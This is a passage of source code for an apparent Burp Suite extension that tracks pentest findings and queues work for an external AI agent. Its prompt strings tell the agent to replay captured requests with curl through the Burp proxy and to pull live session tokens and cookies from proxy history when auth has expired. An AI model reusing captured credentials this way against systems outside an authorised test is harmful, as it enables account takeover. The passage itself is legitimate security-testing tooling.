                                sel_model = self.extender.findingsTable.convertRowIndexToModel(sel_row)
                                selected_finding_id = self.extender.findingsTableModel.getValueAt(sel_model, 0)
                            except:
                                pass

                        self.extender.findingsTableModel.setRowCount(0)
                        for row in findings_snapshot:
                            self.extender.findingsTableModel.addRow(row)

                        # Restore selection
                        if selected_finding_id is not None:
                            for i in range(self.extender.findingsTableModel.getRowCount()):
                                if self.extender.findingsTableModel.getValueAt(i, 0) == selected_finding_id:
                                    try:
                                        view_row = self.extender.findingsTable.convertRowIndexToView(i)
                                        self.extender.findingsTable.setRowSelectionInterval(view_row, view_row)
                                    except:
                                        pass
                                    break
                        self.extender._last_findings_sig = findings_signature
                    timings.append(("findings table", int((time.time() - phase_start) * 1000)))

                    phase_start = time.time()
                    hidden_label = "  |  Hidden: %d" % hidden_count if hidden_count > 0 else ""
                    self.extender.findingsStatsLabel.setText(
                        "Total: %d | Crit: %d | High: %d | Medium: %d | Low: %d | Info: %d%s" %
                        (total_findings, severity_counts["Critical"], severity_counts["High"], severity_counts["Medium"],
                         severity_counts["Low"], severity_counts["Information"], hidden_label)
                    )

                    # Update Findings tab title with count, then re-apply tab colors
                    try:
                        tab_idx = getattr(self.extender, "_findingsTabIndex", 0)
                        title = "Findings (%d)" % total_findings
                        if self.extender.workspaceTabs.getTitleAt(tab_idx) != title:
                            self.extender.workspaceTabs.setTitleAt(tab_idx, title)
                            self.extender._style_all_tab_panes()
                    except:
                        pass
                    timings.append(("findings labels", int((time.time() - phase_start) * 1000)))

                    # Agent queue — rebuild combo box when queue or status changes
                    phase_start = time.time()
                    with self.extender.agent_queue_lock:
                        agent_snapshot = [dict(q) for q in self.extender.agent_queue]
                    agent_count = len(agent_snapshot)
                    status_signature = tuple((q.get("id"), q.get("status"), q.get("outcome", ""), bool(q.get("browser_verify", False))) for q in agent_snapshot)
                    last_agent_sig = getattr(self.extender, "_last_agent_sig", None)
                    if status_signature != last_agent_sig:
                        self.extender._agent_combo_updating = True
                        prev_selected = self.extender.agentHistoryCombo.getSelectedIndex()
                        self.extender.agentHistoryCombo.removeAllItems()
                        for q in agent_snapshot:
                            status = str(q.get("status", ""))
                            status_badge = {
                                "pending": "[PEND]",
                                "claimed": "[WIP ]",
                                "completed": "[DONE]",
                                "failed": "[FAIL]",
                                "cancelled": "[CANC]"
                            }.get(status, "[????]")
                            bv_badge = "[BV] " if q.get("browser_verify") else ""
                            flow_badge = "[FLOW] " if q.get("source") == "flow_analysis" else ""
                            summary = str(q.get("summary", ""))[:50]
                            self.extender.agentHistoryCombo.addItem("#%d %s %s%s%s" % (q.get("id", 0), status_badge, flow_badge, bv_badge, summary))
                        if agent_count > 0:
                            target = prev_selected if 0 <= prev_selected < agent_count else agent_count - 1
                            try:
                                self.extender.agentHistoryCombo.setSelectedIndex(target)
                                self.extender.selected_agent_queue_index = target
                            except:
                                pass
                        self.extender._agent_combo_updating = False
                        self.extender._last_agent_sig = status_signature
                    timings.append(("agent combo", int((time.time() - phase_start) * 1000)))

                    # Agent stats label
                    phase_start = time.time()
                    pending = sum(1 for q in agent_snapshot if q.get("status") == "pending")
                    claimed = sum(1 for q in agent_snapshot if q.get("status") == "claimed")
                    completed = sum(1 for q in agent_snapshot if q.get("status") == "completed")
                    failed = sum(1 for q in agent_snapshot if q.get("status") == "failed")
                    self.extender.agentStatsLabel.setText(
                        "Pending: %d | Claimed: %d | Completed: %d | Failed: %d" % (pending, claimed, completed, failed))

                    # Server status label + button enable/disable
                    try:
                        if self.extender.agent_server is not None:
                            self.extender.agentServerStatusLabel.setText(
                                "Status: Running @ http://%s:%d" % (
                                    self.extender.agent_server_host, self.extender.agent_server_port))
                            self.extender.agentTokenField.setText(self.extender.agent_server_token or "(not set)")
                            self.extender.agentTokenField.setForeground(Color(0x00, 0x80, 0x00))
                            # Start button shows "Running" in green when server is active
                            self.extender.agentStartBtn.setText("Running")
                            self.extender.agentStartBtn.setForeground(Color(0x00, 0x80, 0x00))
                            self.extender.agentStartBtn.setEnabled(False)
                            self.extender.agentStopBtn.setEnabled(True)
                        else:
                            self.extender.agentServerStatusLabel.setText("Status: Stopped")
                            self.extender.agentTokenField.setText("(not set)")
                            self.extender.agentTokenField.setForeground(Color(0x80, 0x80, 0x80))
                            # Reset Start button to default state
                            self.extender.agentStartBtn.setText("Start Server")
                            self.extender.agentStartBtn.setForeground(Color.BLACK)
                            self.extender.agentStartBtn.setEnabled(True)
                            self.extender.agentStopBtn.setEnabled(False)
                    except:
                        pass
                    timings.append(("agent status", int((time.time() - phase_start) * 1000)))

                    # Update Agent tab title with pending count
                    phase_start = time.time()
                    try:
                        tab_idx = getattr(self.extender, "_agentTabIndex", 1)
                        label = "Agent AI"
                        if pending + claimed > 0:
                            label = "Agent AI (%d)" % (pending + claimed)
                        if self.extender.workspaceTabs.getTitleAt(tab_idx) != label:
                            self.extender.workspaceTabs.setTitleAt(tab_idx, label)
                            self.extender._style_all_tab_panes()
                    except:
                        pass
                    timings.append(("tab titles", int((time.time() - phase_start) * 1000)))

                    # Update agent details only when the queue state/selection changed.
                    phase_start = time.time()
                    selected_agent_sig = (
                        status_signature,
                        self.extender.selected_agent_queue_index
                    )
                    if self.extender.selected_agent_queue_index >= 0 and selected_agent_sig != getattr(self.extender, "_last_agent_detail_sig", None):
                        self.extender.updateAgentAssessmentDetails(self.extender.selected_agent_queue_index)
                        self.extender._last_agent_detail_sig = selected_agent_sig
                    timings.append(("agent details", int((time.time() - phase_start) * 1000)))

                    # Console — incremental append
                    phase_start = time.time()
                    if console_changed:
                        if prev_len == 0:
                            # Full rebuild (first load or after trim)
                            console_text = "\n".join(new_messages)
                            self.extender.consoleTextArea.setText(console_text)
                        else:
                            # Append only new messages
                            doc = self.extender.consoleTextArea.getDocument()
                            append_text = "\n" + "\n".join(new_messages)
                            doc.insertString(doc.getLength(), append_text, None)

                        self.extender._last_console_len = current_len

                        was_scrolled = self.extender.console_user_scrolled
                        if not was_scrolled:
                            try:
                                doc = self.extender.consoleTextArea.getDocument()
                                self.extender.consoleTextArea.setCaretPosition(doc.getLength())
                            except:
                                pass
                    timings.append(("console append", int((time.time() - phase_start) * 1000)))

                    # Persist queue if marked dirty by a claim (safe here - we're on the EDT)
                    phase_start = time.time()
                    if getattr(self.extender, '_agent_queue_save_pending', False):
                        self.extender._agent_queue_save_pending = False
                        try:
                            self.extender.save_agent_queue()
                        except:
                            pass
                    timings.append(("queue persist", int((time.time() - phase_start) * 1000)))

                finally:
                    total_ms = int((time.time() - refresh_start) * 1000)
                    self.extender._last_ui_refresh_completed_at = time.time()
                    threshold_ms = int(getattr(self.extender, "PERF_DEBUG_SLOW_MS", 75))
                    if total_ms > threshold_ms or queue_lag_ms > threshold_ms:
                        try:
                            slow_parts = ", ".join("%s=%dms" % (name, ms) for name, ms in timings if ms > 15)
                            if not slow_parts:
                                slow_parts = "no single phase >15ms"
                            self.extender._perf_debug(
                                "refresh#%d total=%dms queue_lag=%dms rows(activity=%d findings=%d console_new=%d) phases=(%s) | %s" % (
                                    int(getattr(self.extender, "_ui_refresh_seq", 0)),
                                    total_ms, queue_lag_ms,
                                    int(locals().get("activity_snapshot_count", 0)),
                                    int(locals().get("findings_snapshot_count", 0)),
                                    int(locals().get("console_new_count", 0)),
                                    slow_parts,
                                    self.extender._perf_counts_snapshot()),
                                key="refresh-slow", min_interval=0.5, force=True)
                        except:
                            pass
                    self.extender._refresh_pending = False

        self._ui_dirty = False
        self._ui_refresh_seq += 1
        self._last_ui_refresh_queued_at = time.time()
        self._refresh_pending = True
        self._perf_debug(
            "refresh#%d queued | %s" % (int(self._ui_refresh_seq), self._perf_counts_snapshot()),
            key="refresh-queued", min_interval=2.0)
        SwingUtilities.invokeLater(RefreshRunnable(self))

    def start_auto_refresh_timer(self):
        """Auto-refresh UI and check for stuck tasks"""
        def refresh_timer():
            check_interval = 0
            debug_interval = 0
            while True:
                try:
                    time.sleep(1)

                    self.refreshUI()

                    debug_interval += 1
                    if debug_interval >= 5:
                        debug_interval = 0
                        pending_age = 0
                        if getattr(self, "_refresh_pending", False):
                            queued_at = float(getattr(self, "_last_ui_refresh_queued_at", 0) or 0)
                            pending_age = int((time.time() - queued_at) * 1000) if queued_at else 0
                        self._perf_debug(
                            "timer heartbeat pending_age=%dms | %s" % (pending_age, self._perf_counts_snapshot()),
                            key="timer-heartbeat", min_interval=5.0)

                    check_interval += 1
                    if check_interval >= 30:
                        self.check_stuck_tasks()
                        self.check_stale_agent_claims()
                        check_interval = 0
                except Exception as e:
                    try:
                        self.stderr.println("[AUTO-REFRESH] Timer loop error: %s" % self._safe_ascii_text(e))
                    except:
                        pass
                    time.sleep(1)

        timer_thread = threading.Thread(target=refresh_timer)
        timer_thread.setDaemon(True)
        timer_thread.start()
    
    def check_stuck_tasks(self):
        """Automatically check for stuck tasks and log warnings"""
        current_time = time.time()
        stuck_found = False
        
        with self.tasks_lock:
            for idx, task in enumerate(self.tasks):
                status = task.get("status", "")
                start_time = task.get("start_time", 0)
                
                # Check if task has been analyzing for >5 minutes
                if ("Analyzing" in status or "Waiting" in status) and start_time > 0:
                    duration = current_time - start_time
                    
                    if duration > 300:  # 5 minutes
                        if not stuck_found:
                            self.stderr.println("\n[AUTO-CHECK] WARNING: STUCK TASK DETECTED")
                            stuck_found = True
                        
                        task_type = task.get("type", "Unknown")
                        url = task.get("url", "Unknown")[:50]
                        self.stderr.println("[AUTO-CHECK] Task %d stuck: %s | %.1f min | %s" % 
                                          (idx, task_type, duration/60, url))
        
        if stuck_found:
            self.stderr.println("[AUTO-CHECK] Run 'Debug Tasks' button for detailed diagnostics")
            self.stderr.println("[AUTO-CHECK] Or click 'Stop Analysis' to clear stuck tasks")

    def check_stale_agent_claims(self):
        """Auto-release agent queue items that have been claimed but inactive too long.

        An item is "stale" if its status is "claimed" and the most recent activity
        timestamp (last_heartbeat_at, result_updated_at, or claimed_at) is older
        than AGENT_CLAIM_TIMEOUT_SEC. The item is moved back to "pending" so it
        can be re-claimed.
        """
        try:
            timeout = float(self.AGENT_CLAIM_TIMEOUT_SEC)
        except Exception:
            timeout = 900.0

        now = time.time()
        released = []
        with self.agent_queue_lock:
            for q in self.agent_queue:
                if q.get("status") != "claimed":
                    continue
                # Pick the most recent activity timestamp we have.
                last_activity_str = (q.get("last_heartbeat_at")
                                     or q.get("result_updated_at")
                                     or q.get("claimed_at"))
                if not last_activity_str:
                    continue
                try:
                    last_ts = time.mktime(time.strptime(str(last_activity_str), "%Y-%m-%d %H:%M:%S"))
                except Exception:
                    continue
                if (now - last_ts) > timeout:
                    q["status"] = "pending"
                    q["claimed_at"] = None
                    q["last_heartbeat_at"] = None
                    q.setdefault("notes", []).append({
                        "at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "note": "Auto-released: claim went stale (no activity for %ds)" % int(timeout)
                    })
                    released.append(q.get("id"))

        if released:
            self.stdout.println("[AGENT] Auto-released %d stale claim(s): %s" % (
                len(released), ", ".join(str(x) for x in released)))
            self._agent_queue_save_pending = True
            self._ui_dirty = True

    def clearCompleted(self, event):
        with self.tasks_lock:
            self.tasks = [t for t in self.tasks if not (
                t.get("status") == "Completed" or 
                "Skipped" in t.get("status", "") or 
                "Error" in t.get("status", "") or
                "Cancelled" in t.get("status", "")
            )]
        self._ui_dirty = True
        self.refreshUI()
    
    def clearFindings(self, event):
        """Clear all findings from the findings table"""
        with self.findings_lock_ui:
            self.findings_list = []
        with self.findings_lock:
            self.findings_cache.clear()
        self.fp_suppressed = set()
        self.save_findings()
        self.stdout.println("[FINDINGS] Cleared all findings")
        self._ui_dirty = True
        self.refreshUI()

    # === Feature #1: Finding detail panel ===
    def _updateFindingDetailPanel(self):
        """Update the finding detail panel based on currently selected finding row."""
        start = time.time()
        try:
            row = self.findingsTable.getSelectedRow()
            if row < 0:
                self.findingDetailText.setText("Select a finding to view details.")
                return
            model_row = self.findingsTable.convertRowIndexToModel(row)
            with self.findings_lock_ui:
                if model_row >= len(self.findings_list):
                    self.findingDetailText.setText("Select a finding to view details.")
                    return
                finding = dict(self.findings_list[model_row])

            parts = []
            parts.append("FINDING: %s" % self._safe_ascii_text(finding.get("title", ""), 1000))
            parts.append("URL: %s" % self._safe_ascii_text(finding.get("url", ""), 2000))
            parts.append("Severity: %s  |  Confidence: %s  |  AI Confidence: %s%%" % (
                self._safe_ascii_text(finding.get("severity", ""), 100),
                self._safe_ascii_text(finding.get("confidence", ""), 100),
                self._safe_ascii_text(finding.get("ai_confidence", ""), 100)))
            if finding.get("agent_status") and finding.get("agent_status") != "untouched":
                parts.append("Agent Triage: %s  |  Priority: %s  |  Updated: %s" % (
                    self._safe_ascii_text(finding.get("agent_status", ""), 100),
                    self._safe_ascii_text(finding.get("agent_priority", ""), 100),
                    self._safe_ascii_text(finding.get("agent_updated_at", ""), 100)))
                if finding.get("agent_rationale"):
                    parts.append("Agent Rationale: %s" % self._safe_ascii_text(finding.get("agent_rationale", ""), 4000))
            recipe = finding.get("active_test_recipe", {}) or {}
            if isinstance(recipe, dict) and recipe:
                parts.append("")
                parts.append("ACTIVE TEST RECIPE:")
                parts.append("Hypothesis: %s" % self._safe_ascii_text(recipe.get("hypothesis", ""), 1200))
                parts.append("Type: %s  |  Max Requests: %s  |  Needs Second User: %s" % (
                    self._safe_ascii_text(recipe.get("active_test_type", ""), 120),
                    self._safe_ascii_text(recipe.get("max_requests", ""), 20),
                    self._safe_ascii_text(recipe.get("needs_second_user", ""), 20)))
                if recipe.get("why_now"):
                    parts.append("Why Now: %s" % self._safe_ascii_text(recipe.get("why_now", ""), 1200))
                if recipe.get("baseline_request"):
                    parts.append("Baseline: %s" % self._safe_ascii_text(recipe.get("baseline_request", ""), 1200))
                if recipe.get("mutation_hint"):
                    parts.append("Mutation: %s" % self._safe_ascii_text(recipe.get("mutation_hint", ""), 1600))
                if recipe.get("expected_vulnerable_signal"):
                    parts.append("Expected Vulnerable Signal: %s" % self._safe_ascii_text(recipe.get("expected_vulnerable_signal", ""), 1200))
                if recipe.get("expected_safe_signal"):
                    parts.append("Expected Safe Signal: %s" % self._safe_ascii_text(recipe.get("expected_safe_signal", ""), 1200))
                if recipe.get("safety_notes"):
                    parts.append("Safety: %s" % self._safe_ascii_text(recipe.get("safety_notes", ""), 1200))
            parts.append("")
            if finding.get("detail"):
                parts.append("DESCRIPTION:")
                parts.append(self._safe_ascii_text(finding.get("detail", ""), 12000))
                parts.append("")
            if finding.get("evidence"):
                parts.append("EVIDENCE:")
                parts.append(self._safe_ascii_text(finding.get("evidence", ""), 12000))
                parts.append("")
            if finding.get("cwe"):
                parts.append("CWE: %s" % self._safe_ascii_text(finding.get("cwe", ""), 200))
            if finding.get("owasp"):
                parts.append("OWASP: %s" % self._safe_ascii_text(finding.get("owasp", ""), 200))
            if finding.get("remediation"):
                parts.append("")
                parts.append("REMEDIATION:")
                parts.append(self._safe_ascii_text(finding.get("remediation", ""), 12000))

            self.findingDetailText.setText(self._safe_ascii_text("\n".join(parts), 40000))
            self.findingDetailText.setCaretPosition(0)
            elapsed_ms = int((time.time() - start) * 1000)
            if elapsed_ms > 250:
                self.stdout.println("[UI PERF] Finding detail render slow: %dms row=%d chars=%d" % (
                    elapsed_ms, model_row + 1, len("\n".join(parts))))
        except Exception as e:
            self.findingDetailText.setText("Error loading finding details: %s" % self._safe_ascii_text(e))

    # === Feature #6: Right-click context menu helpers ===
    def _copyFindingField(self, col_index):
        """Copy a field from the selected finding to the clipboard."""
        try:
            row = self.findingsTable.getSelectedRow()
            if row < 0:
                return
            model_row = self.findingsTable.convertRowIndexToModel(row)
            value = str(self.findingsTable.getModel().getValueAt(model_row, col_index) or "")
            from java.awt import Toolkit
            from java.awt.datatransfer import StringSelection
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            clipboard.setContents(StringSelection(value), None)
            self.log_to_console("[FINDINGS] Copied to clipboard: %s" % value[:80])
        except Exception as e:
            self.stderr.println("[FINDINGS] Copy error: %s" % self._safe_ascii_text(e))

    def _sendFindingToRepeater(self):
        """Send the selected finding's URL to Burp Repeater."""
        try:
            row = self.findingsTable.getSelectedRow()
            if row < 0:
                return
            model_row = self.findingsTable.convertRowIndexToModel(row)
            url = str(self.findingsTable.getModel().getValueAt(model_row, 1) or "")
            if url:
                self._navigate_to_url(url)
        except Exception as e:
            self.stderr.println("[FINDINGS] Send to Repeater error: %s" % self._safe_ascii_text(e))

    def _queueEffectiveSecurityPractices(self):
        """Queue an end-of-test report-support task for the external agent."""
        prompt = (
            "Review the current target.md, findings.md, Burp findings, and completed queue results for this pentest. Print 4-7 concise, high-level effective security practices to the terminal for use in the final report.\n\n"
            "Rules:\n"
            "- Include only behaviors actually observed during this test.\n"
            "- Prefer high-signal controls: authorization enforcement, auth requirements, scoped tokens/SAS, rate limiting, input handling, error handling, and defended attack paths.\n"
            "- Do not pad the list with generic best practices.\n"
            "- Mention the tested endpoint or evidence basis briefly for each item.\n"
            "- Keep language executive-friendly; avoid deep technical detail unless it is needed to explain the control.\n"
            "- Format as plain hyphen bullets only, one sentence per line, exactly like: - Access to the application is consistently protected by login controls.\n"
            "- Do not include numbering, markdown headings, bold text, evidence labels, endpoint names in parentheses, or an introductory/concluding sentence.\n"
            "- Do not create or modify findings.\n"
            "- Output should be ready to paste directly under a final report section titled \"Effective Security Practices\"."
        )
        try:
            with self.agent_queue_lock:
                qid = self.agent_queue_next_id
                self.agent_queue_next_id += 1
                queue_item = {
                    "id": qid,
                    "status": "pending",
                    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "claimed_at": None,
                    "completed_at": None,
                    "finding_ids": [],
                    "summary": "Report support: Effective Security Practices",
                    "assessment": "",
                    "test_results": [],
                    "notes": [],
                    "source": "report_support",
                    "report_task": "effective_security_practices",
                    "user_context": prompt,
                    "browser_verify": False,
                }
                self.agent_queue.append(queue_item)
                self.selected_agent_queue_index = len(self.agent_queue) - 1

            self.save_agent_queue()
            self.log_to_console("[AGENT] Queued Effective Security Practices work item #%d" % qid)
            self._ui_dirty = True
            self.refreshUI()
            self._focus_agent_tab()
        except Exception as e:
            self.stderr.println("[AGENT] Effective security practices queue error: %s" % self._safe_ascii_text(e))

    def _build_request_from_url(self, url):
        """Create a minimal replay request when a finding has URL but no captured request."""
        try:
            from java.net import URL as JavaURL
            parsed = JavaURL(str(url))
            protocol = str(parsed.getProtocol() or "https").lower()
            host = str(parsed.getHost() or "")
            port = int(parsed.getPort())
            if port <= 0:
                port = 443 if protocol == "https" else 80
            path = str(parsed.getFile() or "/")
            if not path:
                path = "/"
            host_header = host
            if (protocol == "https" and port != 443) or (protocol == "http" and port != 80):
                host_header = "%s:%d" % (host, port)
            request_data = (
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n"
                "Accept: */*\r\n"
                "Connection: close\r\n"
                "\r\n"
            ) % (path, host_header)
            return {
                "request_data": request_data,
                "host": host,
                "port": port,
                "protocol": protocol,
            }
        except Exception as e:
            self.stderr.println("[REPRODUCE] Could not build fallback request from URL: %s" % self._safe_ascii_text(e))
            return None

    def _reproduceFinding(self):
        """Queue a 'reproduce' work item for the AI agent.

        The agent is instructed to rebuild and re-send the captured request
        through the native Burp proxy first so the user can observe the
        reproduction live in Burp's HTTP history with a note attached.
        If the original auth has expired, the agent is told to refresh it via
        /api/agent/auth/latest before sending.
        """
        try:
            row = self.findingsTable.getSelectedRow()
            if row < 0:
                self.log_to_console("[REPRODUCE] No finding selected")
                return
            model_row = self.findingsTable.convertRowIndexToModel(row)
            with self.findings_lock_ui:
                if model_row >= len(self.findings_list):
                    return
                finding = dict(self.findings_list[model_row])

            url = finding.get("url", "")
            request_data = finding.get("request_data")
            title = finding.get("title", "")
            external_id = model_row + 1  # 1-based for display / agent
            fallback_request = None

            if not request_data and url:
                fallback_request = self._build_request_from_url(url)
                if fallback_request:
                    request_data = fallback_request.get("request_data")
                    self.stdout.println("[REPRODUCE] Finding #%d has no captured request; queued fallback GET from URL" % external_id)

            if not url or not request_data:
                JOptionPane.showMessageDialog(
                    None,
                    "This finding has no captured request data and no usable URL,\n"
                    "so the agent has nothing to rebuild and replay.\n\nURL: %s" % url,
                    "Cannot reproduce",
                    JOptionPane.WARNING_MESSAGE,
                )
                return

            # Build the user_context message for the agent. This is what shows
            # up in the queue item's USER CONTEXT field and tells the agent
            # exactly what to do.
            user_context = (
                "REPRODUCE finding #%d (\"%s\").\n\n"
                "Build and send this exact HTTP request using native curl through "
                "Burp Proxy. The curl command MUST include -x http://127.0.0.1:8080. Add header "
                "X-Double-Agent-Note: Agent: reproduce finding #%d - replay captured request - expect original behavior. "
                "The extension copies that header into the visible Proxy history note and strips it before upstream. "
                "Use POST /api/agent/request only as a fallback/convenience path. Use the request shown in this work "
                "item's `findings[0].request_data` or `request_data` field as the source of truth.\n"
                "If this work item says the request was synthesized, treat it as a starting point only and recover better auth/method/body from Burp history before deciding reproducibility.\n\n"
                "AUTH: If the captured Authorization / Cookie / CSRF headers look "
                "stale or you get 401/403/419, do NOT ask the user to paste a token. "
                "First call GET /api/agent/auth/latest?host=<host> to pull the "
                "freshest matching auth material from Burp history, then re-build "
                "the request with those headers/cookies. Only ask the user for a "
                "valid token if /api/agent/auth/latest has nothing usable for this host.\n\n"
                "OUTPUT: After sending, POST a queue result with:\n"
                "  - the request you actually sent (after any auth refresh)\n"
                "  - the response status line and a short body snippet\n"
                "  - whether the original finding still reproduces (yes/no/unclear)\n"
                "Do NOT change finding triage state - this is a verification, not retesting."
            ) % (external_id, title[:120], external_id)

            with self.agent_queue_lock:
                qid = self.agent_queue_next_id
                self.agent_queue_next_id += 1
                queue_item = {
                    "id": qid,
                    "status": "pending",
                    "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "claimed_at": None,
                    "completed_at": None,
                    "finding_ids": [model_row],  # internal 0-based
                    "summary": "Reproduce: %s" % (title[:80]),
                    "assessment": "",
                    "test_results": [],
                    "source": "reproduce",
                    "user_context": user_context,
                    "browser_verify": False,
                    "url": url,
                    "request_data": request_data,
                    "response_data": finding.get("response_data") or "",
                    "host": (fallback_request or {}).get("host", ""),
                    "port": (fallback_request or {}).get("port", 0),
                    "protocol": (fallback_request or {}).get("protocol", ""),
                    "notes": ([{
                        "at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "note": "Captured request was missing; generated a fallback GET from the finding URL."
                    }] if fallback_request else []),
                }
                self.agent_queue.append(queue_item)
                self.selected_agent_queue_index = len(self.agent_queue) - 1

            self.save_agent_queue()
            self.log_to_console("[REPRODUCE] Queued reproduction of finding #%d as work item #%d" % (
                external_id, qid))
            self.log_to_console("[REPRODUCE] Agent endpoint: http://%s:%d/api/agent/queue/%d" % (
                self.agent_server_host, self.agent_server_port, qid))
            self._ui_dirty = True
            self.refreshUI()
            self._focus_agent_tab()

            # Friendly nudge if the agent server isn't running yet, so the
            # user knows nothing will happen until they start it.
            try:
                if not getattr(self, "agent_server", None):
                    JOptionPane.showMessageDialog(
                        None,
                        "Reproduction queued as work item #%d.\n\n"
                        "The agent API server is NOT currently running.\n"
                        "Start it from the Agent AI tab so the agent can claim "
                        "the work item and send the request through Burp." % qid,
                        "Reproduce queued",
                        JOptionPane.INFORMATION_MESSAGE,
                    )
            except Exception:
                pass
        except Exception as e:
            self.stderr.println("[REPRODUCE] Error: %s" % self._safe_ascii_text(e))

    def _showReproduceDialog(self, title, body, original_response, new_response):
        """Render the reproduce comparison dialog."""
        from javax.swing import JDialog, JTextArea, JScrollPane, JButton, JLabel
        from java.awt import Dimension as _Dim
        dialog = JDialog()
        dialog.setTitle(title)
        dialog.setSize(1100, 700)
        dialog.setLocationRelativeTo(None)
        dialog.setLayout(BorderLayout())

        header = JTextArea(body)
        header.setEditable(False)
        header.setFont(Font("Monospaced", Font.PLAIN, 12))
        dialog.add(header, BorderLayout.NORTH)

        split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT)
        split.setResizeWeight(0.5)

        origArea = JTextArea(original_response or "")
        origArea.setEditable(False)
        origArea.setFont(Font("Monospaced", Font.PLAIN, 11))
        origPanel = JPanel(BorderLayout())
        origPanel.add(JLabel("  ORIGINAL RESPONSE (captured)"), BorderLayout.NORTH)
        origPanel.add(JScrollPane(origArea), BorderLayout.CENTER)
        split.setLeftComponent(origPanel)

        newArea = JTextArea(new_response or "")
        newArea.setEditable(False)
        newArea.setFont(Font("Monospaced", Font.PLAIN, 11))
        newPanel = JPanel(BorderLayout())
        newPanel.add(JLabel("  NEW RESPONSE (just now)"), BorderLayout.NORTH)
        newPanel.add(JScrollPane(newArea), BorderLayout.CENTER)
        split.setRightComponent(newPanel)

        dialog.add(split, BorderLayout.CENTER)

        closeBtn = JButton("Close")
        closeBtn.addActionListener(lambda e: dialog.dispose())
        btnPanel = JPanel(FlowLayout(FlowLayout.RIGHT))
        btnPanel.add(closeBtn)
        dialog.add(btnPanel, BorderLayout.SOUTH)

        dialog.setVisible(True)

    def _deleteFinding(self):
        """Delete the selected finding from the findings list."""
        try:
            row = self.findingsTable.getSelectedRow()
            if row < 0:
                return
            model_row = self.findingsTable.convertRowIndexToModel(row)
            with self.findings_lock_ui:
                if model_row < len(self.findings_list):
                    removed = self.findings_list.pop(model_row)
                    self.log_to_console("[FINDINGS] Deleted: %s" % str(removed.get("title", ""))[:80])
            self.save_findings()
            self._ui_dirty = True
            self.refreshUI()
        except Exception as e:
            self.stderr.println("[FINDINGS] Delete error: %s" % self._safe_ascii_text(e))

    # === False Positive / Severity / Bulk action helpers ===
    def _toggleShowFP(self):
        """Toggle visibility of hidden non-reportable findings in the table."""
        self._show_fp_findings = not self._show_fp_findings
        try:
            self._showFPBtn.setText("Hide Hidden" if self._show_fp_findings else "Show Hidden")
        except:
            pass
        if hasattr(self, "findingsSorter") and self._fp_row_filter is not None:
            self.findingsSorter.setRowFilter(None if self._show_fp_findings else self._fp_row_filter)
        self._ui_dirty = True
        self.refreshUI()

    def _get_fp_key(self, url, title):
        """Return a hashable key (url, frozenset_of_words) for FP suppression lookup."""
        words = self._normalize_finding_key(title)
        if not words:
            return None
        return (str(url), words)

    def _get_fp_keys_for_finding(self, url, title, source=""):
        keys = []
        fp_key = self._get_fp_key(url, title)
        if fp_key:
            keys.append(fp_key)
        scanner_key = self._scanner_dedupe_key(url, title, source)
        if scanner_key:
            keys.append(("scanner", scanner_key))
        return keys

    def _getSelectedModelRows(self):
        """Return model row indices for all selected view rows, sorted highest-first."""
        rows = self.findingsTable.getSelectedRows()
        return sorted([self.findingsTable.convertRowIndexToModel(r) for r in rows], reverse=True)

    def _markAsFP(self):
        """Mark selected findings as false positives (hidden + future suppression)."""
        try:
            model_rows = self._getSelectedModelRows()
            with self.findings_lock_ui:
                for model_row in model_rows:
                    if model_row < len(self.findings_list):
                        finding = self.findings_list[model_row]
                        fp_keys = self._get_fp_keys_for_finding(
                            finding.get("url", ""), finding.get("title", ""), finding.get("source", "")
                        )
                        for fp_key in fp_keys:
                            self.fp_suppressed.add(fp_key)
                        finding["fp"] = True
                        finding["agent_status"] = "false_positive"
                        finding["agent_priority"] = "defer"
                        finding["agent_updated_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            count = len(model_rows)
            self.log_to_console("[FP] Marked %d finding(s) as false positive" % count)
            self.save_findings()
            self._ui_dirty = True
            self.refreshUI()
        except Exception as e:
            self.stderr.println("[FP] Mark error: %s" % self._safe_ascii_text(e))

    def _unmarkAsFP(self):
        """Remove false positive flag from selected findings and re-enable future detection."""
        try:
            model_rows = self._getSelectedModelRows()
            with self.findings_lock_ui:
                for model_row in model_rows:
                    if model_row < len(self.findings_list):
                        finding = self.findings_list[model_row]
                        for fp_key in self._get_fp_keys_for_finding(
                            finding.get("url", ""), finding.get("title", ""), finding.get("source", "")
                        ):
                            if fp_key in self.fp_suppressed:
                                self.fp_suppressed.discard(fp_key)
                        finding["fp"] = False
                        if finding.get("agent_status") == "false_positive":
                            finding["agent_status"] = "untouched"
                            finding["agent_priority"] = ""
                            finding["agent_updated_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.log_to_console("[FP] Unmarked %d finding(s)" % len(model_rows))
            self.save_findings()
            self._ui_dirty = True
            self.refreshUI()
        except Exception as e:
            self.stderr.println("[FP] Unmark error: %s" % self._safe_ascii_text(e))

    def _setSeverity(self, severity):
        """Override severity on all selected findings."""
        try:
            model_rows = self._getSelectedModelRows()
            with self.findings_lock_ui:
                for model_row in model_rows:
                    if model_row < len(self.findings_list):
                        self.findings_list[model_row]["severity"] = severity
            self.log_to_console("[FINDINGS] Set severity=%s on %d finding(s)" % (severity, len(model_rows)))
            self.save_findings()
            self._ui_dirty = True
            self.refreshUI()
        except Exception as e:
            self.stderr.println("[FINDINGS] Severity override error: %s" % self._safe_ascii_text(e))

    def _deleteSelected(self):
        """Delete all currently selected findings."""
        try:
            model_rows = self._getSelectedModelRows()
            with self.findings_lock_ui:
                for model_row in model_rows:
                    if model_row < len(self.findings_list):
                        self.findings_list.pop(model_row)
            self.log_to_console("[FINDINGS] Deleted %d finding(s)" % len(model_rows))
            self.save_findings()
            self._ui_dirty = True
            self.refreshUI()
        except Exception as e:
            self.stderr.println("[FINDINGS] Delete selected error: %s" % self._safe_ascii_text(e))

    def _askBrowserVerify(self, n_items):
        """Prompt the user whether the agent should verify via browser. Returns True/False/None (cancelled)."""
        try:
            from javax.swing import JOptionPane
            options = ["API/curl only", "Verify in browser", "Cancel"]
            msg = (
                "How should the agent verify the %d finding(s)?\n\n"
